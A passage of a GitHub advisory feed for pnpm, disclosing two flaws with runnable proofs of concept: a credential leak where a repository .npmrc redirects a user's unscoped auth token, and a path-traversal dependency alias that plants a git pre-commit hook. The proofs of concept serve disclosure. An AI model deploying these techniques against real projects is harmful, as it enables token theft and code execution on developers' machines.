        overall.append(npm_summary)

    print(json.dumps(overall, indent=2))

    pnpm_leaked = bool(overall[0]["attacker_auth_hits"])
    npm_leaked = bool(overall[1]["attacker_auth_hits"])
    print(f"OBSERVED_PNPM_AUTH_HITS={len(overall[0]['attacker_auth_hits'])}")
    print(f"OBSERVED_NPM_AUTH_HITS={len(overall[1]['attacker_auth_hits'])}")
    print(
        "COMMAND_EXIT_CODE="
        f"pnpm:{overall[0]['result'].get('returncode', 'missing')} "
        f"npm:{overall[1]['result'].get('returncode', 'missing')}"
    )
    if pnpm_leaked and not npm_leaked:
        print("CHECK pnpm_leaked=true npm_control_held=true result=pass")
        print("VULNERABLE_BEHAVIOR_CONFIRMED")
        print("RESULT_PNPM_REBINDS_UNSCOPED_USER_TOKEN_NPM_CONTROL_HELD")
        print("RESULT_SECURITY_BOUNDARY_BYPASS_CONFIRMED")
        return 0
    if pnpm_leaked and npm_leaked:
        print("CHECK pnpm_leaked=true npm_control_held=false result=fail")
        print("RESULT_BOTH_TOOLS_SENT_AUTH")
        return 2
    print("CHECK pnpm_leaked=false result=fail")
    print("RESULT_NO_PNPM_AUTH_LEAK")
    return 1


if __name__ == "__main__":
    sys.exit(main())
</code></pre>
<h2 id="abbreviated-expected-output">Abbreviated Expected Output</h2>
<pre><code class="language-text">TARGET_VERSION=pnpm 11.2.1; npm 10.9.7
ENVIRONMENT_READY
...
OBSERVED_PNPM_AUTH_HITS=3
OBSERVED_NPM_AUTH_HITS=0
COMMAND_EXIT_CODE=pnpm:0 npm:1
CHECK pnpm_leaked=true npm_control_held=true result=pass
VULNERABLE_BEHAVIOR_CONFIRMED
RESULT_PNPM_REBINDS_UNSCOPED_USER_TOKEN_NPM_CONTROL_HELD
RESULT_SECURITY_BOUNDARY_BYPASS_CONFIRMED
</code></pre>
<p>Reporter: JUNYI LIU</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-cjhr-43r9-cfmw">https://github.com/pnpm/pnpm/security/advisories/GHSA-cjhr-43r9-cfmw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50017">https://nvd.nist.gov/vuln/detail/CVE-2026-50017</a></li>
<li><a href="https://github.com/advisories/GHSA-cjhr-43r9-cfmw">https://github.com/advisories/GHSA-cjhr-43r9-cfmw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cjhr-43r9-cfmw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T22:59:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm binds unscoped user-level npm auth credentials to a repository-selected registry]]></title>
        <id>https://github.com/advisories/GHSA-cjhr-43r9-cfmw</id>
        <link href="https://github.com/advisories/GHSA-cjhr-43r9-cfmw"/>
        <updated>2026-06-26T22:59:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>pnpm can send user-level unscoped npm authentication credentials to a registry chosen by a repository-local <code>.npmrc</code> file.</p>
<p>In the reproduced case, the user's npm config contains a default registry and an unscoped <code>_authToken</code>. The repository does not provide a token-bearing auth line. It only sets <code>registry=</code> to a different registry URL. During normal pnpm metadata/install workflows, pnpm binds the user-origin unscoped credential to the repository-selected registry and sends it as an <code>Authorization</code> header.</p>
<p>This was reproduced with fake credentials and loopback registries only. No third-party registry or real token was used.</p>
<h2 id="affected-behavior-observed">Affected Behavior Observed</h2>
<p>Observed affected:</p>
<ul>
<li>pnpm <code>10.33.2</code>: <code>pnpm install --ignore-scripts</code> sends the user-level unscoped <code>_authToken</code> to the repository-selected registry.</li>
<li>pnpm <code>11.1.3</code>: <code>pnpm install --ignore-scripts</code> sends the user-level unscoped <code>_authToken</code> to the repository-selected registry.</li>
<li>pnpm <code>11.2.1</code> (<code>next-11</code> dist tag at testing time): <code>pnpm install --ignore-scripts</code> sends the user-level unscoped <code>_authToken</code> to the repository-selected registry.</li>
<li>pnpm <code>11.1.3</code>: <code>pnpm view</code> also sends user-level unscoped <code>_authToken</code>, <code>_auth</code>, and <code>username</code> / <code>_password</code> credentials to the repository-selected registry in the local loopback replay.</li>
</ul>
<p>Control:</p>
<ul>
<li>npm <code>10.9.7</code> rejects the same unscoped user <code>_authToken</code> configuration with <code>ERR_INVALID_AUTH</code> and does not send an <code>Authorization</code> header to the  repository-selected registry.</li>
<li>URL-scoped registry token controls held in the local loopback replay: tokens scoped to the trusted registry URL were not sent to the attacker registry.</li>
</ul>
<h2 id="threat-model">Threat Model</h2>
<p>Victim:</p>
<ul>
<li>developer or CI job with user-level npm registry credentials configured;</li>
<li>runs <code>pnpm install</code>, <code>pnpm view</code>, or an equivalent pnpm metadata/restore command in a repository.</li>
</ul>
<p>Attacker:</p>
<ul>
<li>controls repository-local package manager configuration, such as <code>.npmrc</code>;</li>
<li>can set <code>registry=</code> to a registry endpoint they control;</li>
<li>does not need to provide a token-bearing auth line for the strong case.</li>
</ul>
<p>Boundary:</p>
<p>Credentials from a higher-trust user configuration should not be rebound to a lower-trust repository-selected registry unless the credential is explicitly scoped to that registry.</p>
<h2 id="minimal-reproduction">Minimal Reproduction</h2>
<p>The reproducer below starts two loopback HTTP registries:</p>
<ul>
<li>a trusted registry URL used in the isolated user <code>.npmrc</code>;</li>
<li>an attacker registry URL used in the repository-local <code>.npmrc</code>.</li>
</ul>
<p>The isolated user <code>.npmrc</code> contains:</p>
<pre><code class="language-ini">registry=&lt;trusted-loopback-registry&gt;
_authToken=PR166_FAKE_REGISTRY_TOKEN
</code></pre>
<p>The repository-local <code>.npmrc</code> contains:</p>
<pre><code class="language-ini">registry=&lt;attacker-loopback-registry&gt;
</code></pre>
<p>The repository <code>package.json</code> depends on a toy package served by the loopback registry. The script then runs:</p>
<pre><code class="language-text">pnpm install --ignore-scripts
npm install --ignore-scripts
</code></pre>
<h2 id="expected-safe-behavior">Expected Safe Behavior</h2>
<p>pnpm should not send the user-level unscoped <code>_authToken</code> to the repository-selected registry. A safe behavior would be to reject or ignore the unscoped credential in this lower-trust registry-rebinding situation and require the credential to be URL-scoped to the selected registry.</p>
<h2 id="observed-behavior">Observed Behavior</h2>
<p>pnpm <code>10.33.2</code>, pnpm <code>11.1.3</code>, and pnpm <code>11.2.1</code> send:</p>
<pre><code class="language-http">Authorization: Bearer PR166_FAKE_REGISTRY_TOKEN
</code></pre>
<p>to the attacker loopback registry during install. npm <code>10.9.7</code> rejects the same config and sends no <code>Authorization</code> header.</p>
<h2 id="security-impact">Security Impact</h2>
<p>This can disclose npm registry credentials from user-level configuration to a registry endpoint selected by an untrusted repository. The leak occurs before package lifecycle scripts run and does not depend on package code execution.</p>
<h2 id="non-claims">Non-Claims</h2>
<p>This report does not claim:</p>
<ul>
<li>remote code execution;</li>
<li>registry account compromise by itself;</li>
<li>leakage of URL-scoped tokens for a different registry;</li>
<li>npm CLI impact;</li>
<li>impact from a repository explicitly committing its own token-bearing auth
line.</li>
</ul>
<h2 id="source-level-notes">Source-Level Notes</h2>
<p>In pnpm's config/auth-header flow, unscoped/default credentials are parsed from the merged auth config and stored as default credentials. The auth-header logic then maps those default credentials to the effective default registry. Because repository-local <code>.npmrc</code> can change the effective default registry, higher-trust default credentials can be applied to a lower-trust registry choice.</p>
<h2 id="suggested-fix-direction">Suggested Fix Direction</h2>
<p>The conservative fix direction is to reject or contain unscoped/default auth credentials when a lower-trust workspace/repository config changes the default registry. A compatibility-preserving fix could track the source layer of both the default registry and the default credentials, then only bind default credentials to a registry selected by the same or higher-trust source. A stricter npm-compatible fix would reject unscoped auth and require URL-scoped
credentials.</p>
<p>This needs maintainer semantic review and compatibility control because some legacy workflows may intentionally rely on default/unscoped auth.</p>
<h2 id="runnable-reproducer">Runnable Reproducer</h2>
<p>Save the following as <code>repro.py</code> and run it with Python 3 in an environment with pnpm and npm available. To force a specific pnpm version through Corepack, set <code>PR166_PNPM_SPEC</code>, for example <code>PR166_PNPM_SPEC=11.2.1</code>.</p>
<pre><code class="language-python">import base64
import contextlib
import hashlib
import http.server
import io
import json
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
import threading
from pathlib import Path


"""Standalone loopback reproducer.

It creates only temporary directories and loopback HTTP servers. Cleanup is handled by TemporaryDirectory context managers and registry shutdown handlers; no persistent state is expected outside the package-manager cache directories inside the temporary home. Non-claims: this does not use real credentials, third-party registries, package scripts, or remote services. Failure paths return exit 1 or exit 2 through sys.exit(main()).
"""

TOKEN = "PR166_FAKE_REGISTRY_TOKEN"
PACKAGE_TGZ = None


class RegistryHandler(http.server.BaseHTTPRequestHandler):
    requests = []

    def do_GET(self):
        self.requests.append(
            {
                "method": self.command,
                "path": self.path,
                "authorization": self.headers.get("Authorization"),
            }
        )
        if self.path.endswith(".tgz"):
            payload = make_package_tgz()
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)
            return

        payload = make_package_tgz()
        body = json.dumps(
            {
                "name": "@private/probe",
                "dist-tags": {"latest": "1.0.0"},
                "versions": {
                    "1.0.0": {
                        "name": "@private/probe",
                        "version": "1.0.0",
                        "dist": {
                            "tarball": f"http://127.0.0.1:{self.server.server_port}/private/@private/probe/-/probe-1.0.0.tgz",
                            "shasum": hashlib.sha1(payload).hexdigest(),
                            "integrity": "sha512-"
                            + base64.b64encode(hashlib.sha512(payload).digest()).decode("ascii"),
                        },
                    }
                },
            }
        ).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        return


@contextlib.contextmanager
def registry():
    handler = type("RecordingRegistryHandler", (RegistryHandler,), {"requests": []})
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield server, handler.requests
    finally:
        server.shutdown()
        thread.join(timeout=5)
        server.server_close()


def make_package_tgz():
    global PACKAGE_TGZ
    if PACKAGE_TGZ is not None:
        return PACKAGE_TGZ
    bio = io.BytesIO()
    with tarfile.open(fileobj=bio, mode="w:gz") as tf:
        data = b'{"name":"@private/probe","version":"1.0.0"}\n'
        info = tarfile.TarInfo("package/package.json")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    PACKAGE_TGZ = bio.getvalue()
    return PACKAGE_TGZ


def write_text(path, text):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8", newline="\n")


def run_install(tool, trusted_url, attacker_url):
    exe = shutil.which(tool)
    if exe is None:
        return {"tool": tool, "error": "missing"}
    cmd = [exe, "install", "--ignore-scripts"]
    if tool == "pnpm" and os.environ.get("PR166_PNPM_SPEC"):
        corepack = shutil.which("corepack")
        if corepack is None:
            return {"tool": tool, "error": "corepack missing"}
        cmd = [corepack, f"pnpm@{os.environ['PR166_PNPM_SPEC']}", "install", "--ignore-scripts"]

    with tempfile.TemporaryDirectory(prefix=f"pr166-min-{tool}-") as td:
        root = Path(td)
        home = root / "home"
        project = root / "project"
        home.mkdir()
        project.mkdir()
        userconfig = home / ".npmrc"

        write_text(userconfig, f"registry={trusted_url}\n_authToken={TOKEN}\n")
        write_text(project / ".npmrc", f"registry={attacker_url}\n")
        write_text(
            project / "package.json",
            '{"name":"pr166-probe","version":"1.0.0","dependencies":{"@private/probe":"1.0.0"}}\n',
        )

        env = os.environ.copy()
        env.update(
            {
                "HOME": str(home),
                "USERPROFILE": str(home),
                "NPM_CONFIG_USERCONFIG": str(userconfig),
                "npm_config_userconfig": str(userconfig),
                "NPM_CONFIG_CACHE": str(home / "cache"),
                "npm_config_cache": str(home / "cache"),
                "NPM_CONFIG_STORE_DIR": str(home / "store"),
                "npm_config_store_dir": str(home / "store"),
                "XDG_CACHE_HOME": str(home / "xdg-cache"),
                "XDG_DATA_HOME": str(home / "xdg-data"),
                "NO_COLOR": "1",
            }
        )

        proc = subprocess.run(
            cmd,
            cwd=str(project),
            env=env,
            text=True,
            encoding="utf-8",
            errors="replace",
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=60,
        )
        return {"tool": tool, "returncode": proc.returncode, "output_tail": proc.stdout[-2000:]}


def summarize(tool, result, attacker_requests):
    auth_hits = [r for r in attacker_requests if r.get("authorization")]
    return {
        "tool": tool,
        "result": result,
        "attacker_auth_hits": auth_hits,
        "attacker_request_count": len(attacker_requests),
    }


def tool_version(tool):
    exe = shutil.which(tool)
    if exe is None:
        return "missing"
    cmd = [exe, "--version"]
    if tool == "pnpm" and os.environ.get("PR166_PNPM_SPEC"):
        corepack = shutil.which("corepack")
        if corepack is None:
            return "corepack missing"
        cmd = [corepack, f"pnpm@{os.environ['PR166_PNPM_SPEC']}", "--version"]
    proc = subprocess.run(
        cmd,
        text=True,
        encoding="utf-8",
        errors="replace",
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=20,
    )
    return proc.stdout.strip() or f"exit-{proc.returncode}"


def main():
    pnpm_version = tool_version("pnpm")
    npm_version = tool_version("npm")
    print(f"TARGET_VERSION=pnpm {pnpm_version}; npm {npm_version}")
    if pnpm_version == "missing" or npm_version == "missing":
        print("CHECK environment_has_pnpm_and_npm result=fail")
        return 1

    print("ENVIRONMENT_READY")
    overall = []
    with registry() as (trusted, _trusted_requests), registry() as (attacker, attacker_requests):
        trusted_url = f"http://127.0.0.1:{trusted.server_port}/private/"
        attacker_url = f"http://127.0.0.1:{attacker.server_port}/private/"

        before = len(attacker_requests)
        pnpm_result = run_install("pnpm", trusted_url, attacker_url)
        pnpm_summary = summarize("pnpm", pnpm_result, attacker_requests[before:])
        overall.append(pnpm_summary)

        before = len(attacker_requests)
        npm_result = run_install("npm", trusted_url, attacker_url)
        npm_summary = summarize("npm", npm_result, attacker_requests[before:])
        overall.append(npm_summary)

    print(json.dumps(overall, indent=2))

    pnpm_leaked = bool(overall[0]["attacker_auth_hits"])
    npm_leaked = bool(overall[1]["attacker_auth_hits"])
    print(f"OBSERVED_PNPM_AUTH_HITS={len(overall[0]['attacker_auth_hits'])}")
    print(f"OBSERVED_NPM_AUTH_HITS={len(overall[1]['attacker_auth_hits'])}")
    print(
        "COMMAND_EXIT_CODE="
        f"pnpm:{overall[0]['result'].get('returncode', 'missing')} "
        f"npm:{overall[1]['result'].get('returncode', 'missing')}"
    )
    if pnpm_leaked and not npm_leaked:
        print("CHECK pnpm_leaked=true npm_control_held=true result=pass")
        print("VULNERABLE_BEHAVIOR_CONFIRMED")
        print("RESULT_PNPM_REBINDS_UNSCOPED_USER_TOKEN_NPM_CONTROL_HELD")
        print("RESULT_SECURITY_BOUNDARY_BYPASS_CONFIRMED")
        return 0
    if pnpm_leaked and npm_leaked:
        print("CHECK pnpm_leaked=true npm_control_held=false result=fail")
        print("RESULT_BOTH_TOOLS_SENT_AUTH")
        return 2
    print("CHECK pnpm_leaked=false result=fail")
    print("RESULT_NO_PNPM_AUTH_LEAK")
    return 1


if __name__ == "__main__":
    sys.exit(main())
</code></pre>
<h2 id="abbreviated-expected-output">Abbreviated Expected Output</h2>
<pre><code class="language-text">TARGET_VERSION=pnpm 11.2.1; npm 10.9.7
ENVIRONMENT_READY
...
OBSERVED_PNPM_AUTH_HITS=3
OBSERVED_NPM_AUTH_HITS=0
COMMAND_EXIT_CODE=pnpm:0 npm:1
CHECK pnpm_leaked=true npm_control_held=true result=pass
VULNERABLE_BEHAVIOR_CONFIRMED
RESULT_PNPM_REBINDS_UNSCOPED_USER_TOKEN_NPM_CONTROL_HELD
RESULT_SECURITY_BOUNDARY_BYPASS_CONFIRMED
</code></pre>
<p>Reporter: JUNYI LIU</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-cjhr-43r9-cfmw">https://github.com/pnpm/pnpm/security/advisories/GHSA-cjhr-43r9-cfmw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50017">https://nvd.nist.gov/vuln/detail/CVE-2026-50017</a></li>
<li><a href="https://github.com/advisories/GHSA-cjhr-43r9-cfmw">https://github.com/advisories/GHSA-cjhr-43r9-cfmw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cjhr-43r9-cfmw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T22:59:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: Transitive dependency alias path traversal allows project path override via symlink replacement]]></title>
        <id>https://github.com/advisories/GHSA-hwx4-2j3j-g496</id>
        <link href="https://github.com/advisories/GHSA-hwx4-2j3j-g496"/>
        <updated>2026-06-26T22:55:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>pnpm allows a transitive dependency alias from registry package metadata to contain path traversal segments. During install, pnpm later uses that alias as a filesystem path when linking dependency nodes. As a result, a registry package can cause <code>pnpm install - ignore-scripts</code> to replace paths in the current project with symlinks to attacker-controlled dependency package directories.</p>
<p><code>.git/hooks</code> is only one useful target. The same primitive can replace other project-local paths that are consumed by later tools, for example:</p>
<ul>
<li><code>.husky</code> or <code>.githooks</code> for Git hook dispatchers</li>
<li><code>scripts/</code>, <code>tools/</code>, <code>bin/</code>, or <code>tests/</code> for project scripts and CI commands</li>
<li><code>.github/actions/&lt;name&gt;</code> for local GitHub Actions used later in the workflow</li>
<li><code>dist/</code> or other publish/build output directories before <code>pnpm pack</code> or
<code>pnpm publish</code></li>
<li><code>node_modules/.bin</code> or undeclared <code>node_modules/&lt;name&gt;</code> paths used by later
command or module resolution</li>
</ul>
<p>Targets that are regular files can also be replaced with symlinks to a package directory, but those cases are usually denial of service. Directory targets are more useful because many developer tools execute or load files from those directories after installation.</p>
<p>This was reproduced with <code>pnpm@11.2.1</code>.</p>
<h2 id="impact">Impact</h2>
<p>Users often run <code>pnpm install --ignore-scripts</code> expecting that untrusted package code cannot execute during installation. This issue bypasses that expectation: the malicious package does not need a lifecycle script. Instead, it silently rewires project files or directories during install, and the payload runs when the user or CI later executes another normal command.</p>
<p>Examples include <code>git commit</code>, <code>pnpm test</code>, <code>pnpm run build</code>, a CI step that uses a local GitHub Action, or <code>pnpm publish</code> packaging a replaced <code>dist/</code> directory. In this PoC, the victim installs a normal registry package, the transitive malicious package replaces <code>.git/hooks</code>, and the payload runs when the victim later executes <code>git commit</code>.</p>
<h2 id="root-cause">Root Cause</h2>
<p>pnpm preserves dependency alias names from package metadata and later passes those aliases into dependency linking as path components. The alias is joined with the destination <code>node_modules</code> directory and passed to the symlink creation logic without rejecting <code>..</code> segments or checking that the normalized result stays inside the intended <code>node_modules</code> directory.</p>
<p>Conceptually, a transitive alias like this:</p>
<pre><code class="language-json">{
  "@x/../../../../../.git/hooks": "npm:payload-hooks@1.0.0"
}
</code></pre>
<p>is eventually treated like:</p>
<pre><code class="language-text">path.join(parentPackageNodeModulesDir, "@x/../../../../../.git/hooks")
</code></pre>
<p>The normalized destination escapes the dependency's <code>node_modules</code> directory and lands at the victim project's <code>.git/hooks</code> path. pnpm then creates a symlink at that escaped destination to the resolved <code>payload-hooks</code> package directory.</p>
<p>The dependency chain is:</p>
<pre><code class="language-text">victim installs normal@1.0.0
normal@1.0.0 -&gt; bad@1.0.0
bad@1.0.0 -&gt; payload-hooks@1.0.0 through a traversal alias
</code></pre>
<p>The malicious transitive package metadata contains:</p>
<pre><code class="language-json">{
  "@x/../../../../../.git/hooks": "npm:payload-hooks@1.0.0"
}
</code></pre>
<p>Because this uses an <code>npm:</code> registry alias, it does not rely on a transitive <code>file:</code> or <code>link:</code> dependency.</p>
<h2 id="proof-of-concept">Proof Of Concept</h2>
<p>Run:</p>
<pre><code class="language-sh">./run.sh
</code></pre>
<pre><code class="language-sh">#!/bin/sh
set -eu

SCRIPT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" &amp;&amp; pwd)
WORKDIR="$SCRIPT_DIR/demo-workdir"
REGISTRY_DIR="$WORKDIR/registry"
TARBALLS_DIR="$REGISTRY_DIR/tarballs"
VICTIM_DIR="$WORKDIR/victim"
READY_FILE="$WORKDIR/registry-ready"
PORT_FILE="$WORKDIR/registry-port"

rm -rf "$WORKDIR"
mkdir -p "$REGISTRY_DIR/payload-hooks" "$REGISTRY_DIR/bad" "$REGISTRY_DIR/normal" "$TARBALLS_DIR" "$VICTIM_DIR"

cat &gt; "$REGISTRY_DIR/payload-hooks/package.json" &lt;&lt;'JSON'
{
  "name": "payload-hooks",
  "version": "1.0.0",
  "bin": {
    "pre-commit": "pre-commit"
  },
  "files": [
    "pre-commit"
  ]
}
JSON

cat &gt; "$REGISTRY_DIR/payload-hooks/pre-commit" &lt;&lt;'EOF'
#!/bin/sh
echo PWNED &gt;&amp;2
exit 0
EOF
chmod +x "$REGISTRY_DIR/payload-hooks/pre-commit"

cat &gt; "$REGISTRY_DIR/bad/package.json" &lt;&lt;'JSON'
{
  "name": "bad",
  "version": "1.0.0",
  "description": "transitive registry package",
  "dependencies": {
    "@x/../../../../../.git/hooks": "npm:payload-hooks@1.0.0"
  }
}
JSON

cat &gt; "$REGISTRY_DIR/normal/package.json" &lt;&lt;'JSON'
{
  "name": "normal",
  "version": "1.0.0",
  "description": "normal looking package from a registry",
  "dependencies": {
    "bad": "1.0.0"
  }
}
JSON

(cd "$REGISTRY_DIR/payload-hooks" &amp;&amp; npm pack --pack-destination "$TARBALLS_DIR" --silent &gt;/dev/null)
(cd "$REGISTRY_DIR/bad" &amp;&amp; npm pack --pack-destination "$TARBALLS_DIR" --silent &gt;/dev/null)
(cd "$REGISTRY_DIR/normal" &amp;&amp; npm pack --pack-destination "$TARBALLS_DIR" --silent &gt;/dev/null)

node - "$REGISTRY_DIR" "$READY_FILE" "$PORT_FILE" &lt;&lt;'NODE' &amp;
const http = require('node:http')
const fs = require('node:fs')
const path = require('node:path')
const { execFileSync } = require('node:child_process')

const [registryDir, readyFile, portFile] = process.argv.slice(2)
const tarballsDir = path.join(registryDir, 'tarballs')

function shasum (filename) {
  return execFileSync('openssl', ['dgst', '-sha1', path.join(tarballsDir, filename)])
    .toString()
    .trim()
    .split(/\s+/)
    .pop()
}

function integrity (filename) {
  return 'sha512-' + execFileSync('openssl', ['dgst', '-sha512', '-binary', path.join(tarballsDir, filename)])
    .toString('base64')
}

function packument (pkgName, req) {
  const filename = `${pkgName}-1.0.0.tgz`
  const manifest = JSON.parse(fs.readFileSync(path.join(registryDir, pkgName, 'package.json'), 'utf8'))
  const origin = `http://${req.headers.host}`
  return {
    name: pkgName,
    'dist-tags': {
      latest: '1.0.0',
    },
    versions: {
      '1.0.0': {
        ...manifest,
        dist: {
          tarball: `${origin}/${pkgName}/-/${filename}`,
          shasum: shasum(filename),
          integrity: integrity(filename),
        },
      },
    },
  }
}

const server = http.createServer((req, res) =&gt; {
  const pathname = new URL(req.url, 'http://local.invalid').pathname
  if (req.method !== 'GET') {
    res.writeHead(405)
    res.end('method not allowed')
    return
  }
  if (pathname === '/normal' || pathname === '/bad' || pathname === '/payload-hooks') {
    const pkgName = pathname.slice(1)
    res.writeHead(200, { 'content-type': 'application/json' })
    res.end(JSON.stringify(packument(pkgName, req)))
    return
  }
  const tarballMatch = pathname.match(/^\/(normal|bad|payload-hooks)\/-\/(.+\.tgz)$/)
  if (tarballMatch) {
    const file = path.join(tarballsDir, tarballMatch[2])
    res.writeHead(200, { 'content-type': 'application/octet-stream' })
    fs.createReadStream(file).pipe(res)
    return
  }
  res.writeHead(404)
  res.end('not found')
})

server.listen(0, '127.0.0.1', () =&gt; {
  fs.writeFileSync(portFile, String(server.address().port))
  fs.writeFileSync(readyFile, 'ready')
})
NODE
REGISTRY_PID=$!
trap 'kill "$REGISTRY_PID" 2&gt;/dev/null || true' EXIT INT TERM

WAIT_COUNT=0
while [ ! -f "$READY_FILE" ]; do
  WAIT_COUNT=$((WAIT_COUNT + 1))
  if [ "$WAIT_COUNT" -gt 100 ]; then
    echo "local registry did not start" &gt;&amp;2
    exit 1
  fi
  sleep 0.05
done
REGISTRY_PORT=$(cat "$PORT_FILE")

cd "$VICTIM_DIR"
git init -q
git config user.email demo@example.invalid
git config user.name "Demo User"

cat &gt; package.json &lt;&lt;'JSON'
{
  "name": "victim",
  "version": "1.0.0"
}
JSON

cat &gt; .npmrc &lt;&lt;EOF
registry=http://127.0.0.1:$REGISTRY_PORT/
EOF

printf 'pnpm: '
pnpm --version
printf 'registry: http://127.0.0.1:%s/\n' "$REGISTRY_PORT"
printf 'victim: %s\n\n' "$VICTIM_DIR"

pnpm install normal@1.0.0 --ignore-scripts --config.confirmModulesPurge=false --reporter=silent

echo 'trigger commit' &gt; change.txt
git add change.txt

set +e
COMMIT_STDERR=$(git commit -m 'trigger pre-commit' 2&gt;&amp;1 &gt;/dev/null)
COMMIT_STATUS=$?
set -e

printf '\ngit commit exit code: %s\n' "$COMMIT_STATUS"
printf 'git commit stderr:\n%s\n' "$COMMIT_STDERR"
</code></pre>
<p>The script starts a local npm-compatible registry, writes a victim project <code>.npmrc</code> that points to that registry, installs <code>normal@1.0.0</code> with <code>--ignore-scripts</code>, and then triggers <code>git commit</code>.</p>
<p>Requirements:</p>
<pre><code class="language-text">pnpm
npm
node
git
openssl
</code></pre>
<p>Expected output:</p>
<pre><code class="language-text">git commit exit code: 0
git commit stderr:
PWNED
</code></pre>
<p><code>PWNED</code> is printed by the attacker-controlled <code>pre-commit</code> hook from the <code>payload-hooks</code> package.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-hwx4-2j3j-g496">https://github.com/pnpm/pnpm/security/advisories/GHSA-hwx4-2j3j-g496</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50016">https://nvd.nist.gov/vuln/detail/CVE-2026-50016</a></li>
<li><a href="https://github.com/advisories/GHSA-hwx4-2j3j-g496">https://github.com/advisories/GHSA-hwx4-2j3j-g496</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hwx4-2j3j-g496</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-26T22:55:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: Transitive dependency alias path traversal allows project path override via symlink replacement]]></title>
        <id>https://github.com/advisories/GHSA-hwx4-2j3j-g496</id>
        <link href="https://github.com/advisories/GHSA-hwx4-2j3j-g496"/>
        <updated>2026-06-26T22:55:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>pnpm allows a transitive dependency alias from registry package metadata to contain path traversal segments. During install, pnpm later uses that alias as a filesystem path when linking dependency nodes. As a result, a registry package can cause <code>pnpm install - ignore-scripts</code> to replace paths in the current project with symlinks to attacker-controlled dependency package directories.</p>
<p><code>.git/hooks</code> is only one useful target. The same primitive can replace other project-local paths that are consumed by later tools, for example:</p>
<ul>
<li><code>.husky</code> or <code>.githooks</code> for Git hook dispatchers</li>
<li><code>scripts/</code>, <code>tools/</code>, <code>bin/</code>, or <code>tests/</code> for project scripts and CI commands</li>
<li><code>.github/actions/&lt;name&gt;</code> for local GitHub Actions used later in the workflow</li>
<li><code>dist/</code> or other publish/build output directories before <code>pnpm pack</code> or
<code>pnpm publish</code></li>
<li><code>node_modules/.bin</code> or undeclared <code>node_modules/&lt;name&gt;</code> paths used by later
command or module resolution</li>
</ul>
<p>Targets that are regular files can also be replaced with symlinks to a package directory, but those cases are usually denial of service. Directory targets are more useful because many developer tools execute or load files from those directories after installation.</p>
<p>This was reproduced with <code>pnpm@11.2.1</code>.</p>
<h2 id="impact">Impact</h2>
<p>Users often run <code>pnpm install --ignore-scripts</code> expecting that untrusted package code cannot execute during installation. This issue bypasses that expectation: the malicious package does not need a lifecycle script. Instead, it silently rewires project files or directories during install, and the payload runs when the user or CI later executes another normal command.</p>
<p>Examples include <code>git commit</code>, <code>pnpm test</code>, <code>pnpm run build</code>, a CI step that uses a local GitHub Action, or <code>pnpm publish</code> packaging a replaced <code>dist/</code> directory. In this PoC, the victim installs a normal registry package, the transitive malicious package replaces <code>.git/hooks</code>, and the payload runs when the victim later executes <code>git commit</code>.</p>
<h2 id="root-cause">Root Cause</h2>
<p>pnpm preserves dependency alias names from package metadata and later passes those aliases into dependency linking as path components. The alias is joined with the destination <code>node_modules</code> directory and passed to the symlink creation logic without rejecting <code>..</code> segments or checking that the normalized result stays inside the intended <code>node_modules</code> directory.</p>
<p>Conceptually, a transitive alias like this:</p>
<pre><code class="language-json">{
  "@x/../../../../../.git/hooks": "npm:payload-hooks@1.0.0"
}
</code></pre>
<p>is eventually treated like:</p>
<pre><code class="language-text">path.join(parentPackageNodeModulesDir, "@x/../../../../../.git/hooks")
</code></pre>
<p>The normalized destination escapes the dependency's <code>node_modules</code> directory and lands at the victim project's <code>.git/hooks</code> path. pnpm then creates a symlink at that escaped destination to the resolved <code>payload-hooks</code> package directory.</p>
<p>The dependency chain is:</p>
<pre><code class="language-text">victim installs normal@1.0.0
normal@1.0.0 -&gt; bad@1.0.0
bad@1.0.0 -&gt; payload-hooks@1.0.0 through a traversal alias
</code></pre>
<p>The malicious transitive package metadata contains:</p>
<pre><code class="language-json">{
  "@x/../../../../../.git/hooks": "npm:payload-hooks@1.0.0"
}
</code></pre>
<p>Because this uses an <code>npm:</code> registry alias, it does not rely on a transitive <code>file:</code> or <code>link:</code> dependency.</p>
